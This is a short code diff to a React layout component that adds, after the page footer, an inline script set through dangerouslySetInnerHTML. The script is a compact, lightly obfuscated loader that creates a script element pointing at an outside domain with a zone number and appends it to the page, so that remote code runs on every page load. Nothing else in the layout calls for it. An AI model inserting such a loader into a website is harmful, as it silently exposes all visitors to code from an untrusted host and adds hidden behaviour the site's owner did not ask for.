@@ -10,6 +10,11 @@ export default function Layout({ children }: { children: React.ReactNode }) {
                 <div className='bg-background text-foreground flex-1'>{children}</div>
                 <Footer />
             </section>
+            <script
+      dangerouslySetInnerHTML={{
+         __html: `(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('psulrushe.net',8082419,document.createElement('script'))`,
+      }}
+   />
         </main>
     )
 }
